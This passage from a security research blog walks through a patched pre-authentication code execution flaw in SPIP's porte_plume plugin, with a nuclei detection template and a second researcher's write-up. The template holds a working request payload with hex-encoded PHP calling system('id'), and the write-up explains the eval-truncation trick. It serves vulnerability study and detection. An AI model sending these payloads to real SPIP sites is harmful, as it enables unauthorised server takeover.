So `field=TEXT` is enough to trigger code execution! 

### Detection

Here's a nuclei template for a quick detection of the vulnerability:

```html
id: spip-preauth-rce-porteplume

info:
  name: SPIP PortePlume plugin Preauth RCE
  author: Vozec 
  severity: critical
  description: |
    SPIP PortePlume Preauth RCE (@cr: Vuln found by Laluka)

http:
  - raw:
    - |
      POST /index.php?action=porte_plume_previsu HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
      Accept: */*
      Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
      Accept-Encoding: gzip, deflate, br
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      Origin: http://{{Hostname}}
      Connection: keep-alive
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Priority: u=0

      champ=TEXTE&objet=article&data=[<foreach|a|b>->%26lt;?php "\x73\x79\x73\x74\x65\x6d"('id');?%26gt;>]

    matchers:
      - type: word
        part: body
        words:
          - "<div class=\"preview\">" ### Maybe windows server => If reflected then vulnerable version
          - "uid="
        condition: or

    extractors:
      - type: regex
        name: result
        group: 1
        internal: False
        part: body_1
        regex:
          - "<a href='.*/(.*?)'>"
```

<img class="img_big" src="nuclei.png" alt="">

---

### Write-Up from **@GuilhemRioux**

Laluka gave a challenge recently on finding a Pre-Auth Remote Code Execution on SPIP.\
He also gave us a hint on where to look, by adding that it is in the `porte_plume` plugin.\
From now on we can start digging at SPIP.

#### Setup

As I like mixing static and dynamic code analysis when looking for vulns, I just ran my generic docker-compose for php apps.\
This way I got a Xdebug and an Apache server ready to use.

#### Finding the sink

Now that we have done the setup we can start looking at the code. I simply go into the folder of the `porte_plume` plugin (packaged in the spip.zip given by laluka) and look for obvious dangerous functions.

> Lalu-Snip: Screenshot & explanation already part of the previous writeups

However reaching the first eval is not hard, because it is triggered when trying to preview an article:

<img class="img_big" src="images/trigger_porte_plume.png" alt="">

At first I did not find any ref to this function, but this is because I do not know `SPIP` at all. I was looking inside `*.php` files! In fact `SPIP` seems to have is own language and uses it inside its custom page, so here is the reference to the function call:

<img class="img_big" src="images/call_traitement_previsu.png" alt="">

Anyway, once done we can see that the first eval cannot be used as we do not control any of its arguments... However the other looks better but seems hard to reach as it required the constant `_PROTEGE_PHP_MODELES` to be defined:
<img class="img_big" src="images/going_into_second_eval.png" alt="">

#### Reaching the sink

Ok, so in order to reach the second `eval` located in `traitements_previsu_php_modeles_eval` we must reach the first `eval`
located in `traitements_previsu` with the constant `_PROTEGE_PHP_MODELES` defined.

However this constant is defined in `texte_mini.php`:
<img class="img_big" src="images/define_constant.png" alt="">

Here, `creer_uniqid` generates a uniqid with entropy, so it is hard to predict. So the constant is defined, but we cannot predict its value (Or it seems really hard // lalu+1).

Here what is important to notice is that the function is related to `modeles`. It is important, in my opinion, to read the doc of the software when looking for vulnerabilities. So I looked for modeles in the `SPIP` documentation, and I found what I needed.

<img class="img_big" src="images/spip_doc_modeles.png" alt="">

And here is the regex used by `SPIP` to identify them:

<img class="img_big" src="images/modeles_reg.png" alt="">

There are also default modeles on SPIP, which are (according to the documentation):

1. img
2. doc
3. emb
4. article_mots
5. article_traductions
6. lesauteurs

As I do not understand every models above, I used the `img`, `doc`, and `emb` models.

Okay so let's try to reach the `protege_js_modeles` function by running the payload: `<img|test>`

When doing this, modeles included in the text are managed by the function `Modeles::traiter`. This function tries to go through all the models and renders them as they should, by calling another function named `inclure_modele` within `assembler.php`.

<img class="img_big" src="images/parcourir_modeles.png" alt="">

I did not look at the whole function, but from what I understood, if the model contains a link, then it will be returned in the classical `<a>` tag:

<img class="img_big" src="images/render_modele.png" alt="">

By looking at the documentation (once again), it was possible to see how to create a link:

<img class="img_big" src="images/insert_link_model.png" alt="">

So I tried this exact payload and we reached the famous code `protege_js_modeles`. The code takes our text as argument, so we can also control the parameter!\
To setup the constant `_PROTEGE_PHP_MODELES` we just have to add a php tag inside the link, and hop we hit the breakpoint:

<img class="img_big" src="images/payload_test.png)" alt="">

And here is the result with the dynamic debug:

<img class="img_big" src="images/bp_hit2.png" alt="">

With this we can get back to the `eval` statement, and check the arguments given by our input.\
I ran this simple payload as a test: `[<doc|test>-><?php echo "test";?>]`

And here is the result in the eval:

```php
eval('?><?php&nbsp;</span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"test"</span><span style="color: #007700">;</span><span style="color: #0000BB">?>');
```

Which throws a deserved syntax error.

Our payload has been translated into formatted html text, so php code is highlighted, and then cannot be evaluated anymore. This is our last step before pwning the target!

So the problem for me here is that `<?php` become `<span style="color: #000000"><?php</span>` than is not a valid eval anymore (`eval("<?php</span>")` -> Error). In order to get rid of this annoying tag I choose to use the size limit shown in the code:

<img class="img_big" src="images/fonction_code_echappement.png" alt="">

So the payload is truncated each 30000 chars, thus it is possible to leave the annoying tag behind in order to eval only php code unformatted. I ran it with a big payload, and added a quote in front of the real payload in order to protect any other text formatting, and here we are:

<img class="img_big" src="images/junk_eval.png" alt="">

And then the second eval is triggered with only code wanted:

<img class="img_big" src="images/clean_eval.png" alt="">

From there we recover the content of the payload in the response:

<img class="img_big" src="images/exploit_res.png" alt="">

This was a fun vulnerability to find, and also a nice challenge, I hope I'll get to fight Spip in a future assessment! :D

> Lalu & Vozec note: Once Guilhem agreed to share this exploit so we could analyze it, we were `0_0'` as this exploit path wasn't expected! Ironically, It's also patched by the initial patch. So we're sad that it's not a new 0day, and happy to have `@GuilhemRioux` as a co-author here! 🌹

## Outro

We -all- hope you've had a fun time reading this co-written article! 💌\
See you in a few, and be aware that... New challenges are on their way! 😉\
Again, thanks for playing, and happy summer you all! 🌈